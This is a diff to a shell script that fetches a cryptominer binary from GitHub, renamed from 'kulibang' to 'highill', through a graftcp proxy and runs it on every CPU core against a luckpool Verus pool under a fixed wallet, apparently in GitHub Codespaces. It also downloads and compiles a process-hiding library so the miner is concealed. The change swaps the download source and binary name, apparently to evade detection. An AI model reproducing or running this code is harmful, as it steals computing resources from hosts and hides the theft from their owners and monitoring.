@@ -36,7 +36,7 @@ run_ccminer() {
   local proxy=$1
 
   # Kill any leftover ccminer processes from previous runs
-  pkill -f 'kulibang'
+  pkill -f 'highill'
   sleep 2  # Wait to ensure all processes are terminated
 
   # Set up graftcp configuration
@@ -57,13 +57,13 @@ END
   echo " "
 
   # Download and configure highill
-  ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
-  chmod +x kulibang
+  ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/highill
+  chmod +x highill
 
   # Run processHider only during the first loop
   if [ "$process_hider_installed" = false ]; then
     echo "Installing processHider for the first time..."
-    ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/proccessHider.zip
+    ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/proccessHider.zip
     unzip proccessHider.zip
     make
     gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
@@ -73,7 +73,7 @@ END
   fi
 
   # Run ccminer in the background
-  ./graftcp/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.GH_SPACE -p x d=4096S -t "$(nproc)" &
+  ./graftcp/graftcp ./highill -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.GH_SPACE -p x d=4096S -t "$(nproc)" &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
@@ -81,7 +81,7 @@ END
   # Sleep for xx minutes
   sleep 3600
 
-  rm kulibang
+  rm highill
 
   # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
   kill -2 $ccminer_pid
@@ -102,7 +102,7 @@ END
   fi
 
   # Ensure all ccminer processes are terminated before proceeding
-  pkill -f 'kulibang'
+  pkill -f 'highill'
   sleep 2  # Wait to ensure all processes are cleared
 }
 
